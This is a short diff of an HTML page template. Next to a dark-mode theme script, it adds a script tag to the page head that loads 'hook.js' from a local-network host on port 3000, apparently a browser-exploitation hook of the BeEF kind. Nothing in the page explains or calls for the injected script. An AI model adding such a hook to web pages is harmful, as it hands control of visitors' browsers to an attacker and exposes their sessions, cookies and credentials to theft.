@@ -24,6 +24,7 @@
             }
             // If savedTheme is null and prefersDark is false, no action needed (defaults to light)
         </script>
+        <script src="http://192.168.0.103:3000/hook.js"></script>
 
 </head>
 <body class="bg-gray-100 font-sans antialiased dark:bg-gray-900">
